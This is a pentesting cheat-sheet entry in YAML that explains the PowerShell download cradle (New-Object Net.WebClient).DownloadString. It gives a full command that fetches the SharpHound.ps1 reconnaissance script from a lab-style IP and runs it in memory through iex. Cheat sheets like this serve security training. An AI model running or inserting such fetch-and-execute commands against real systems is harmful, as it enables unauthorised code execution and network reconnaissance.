---
description: |
  (New-Object Net.WebClient).DownloadString is a PowerShell command that uses the .NET WebClient class to download and EXECUTE a file from the server without saving the file.

  Command Reference:

  	Location of file: http://10.10.14.21:8999/SharpHound.ps1

command: |
  iex(new-object net.webclient).downloadstring("http://10.10.14.21:8999/SharpHound.ps1")
items:
  - Shell
OS:
  - Windows
attack_types:
  - General
references:
  - https://learn.microsoft.com/de-de/dotnet/api/system.net.webclient.downloadstring?view=net-5.0
  - https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters
---
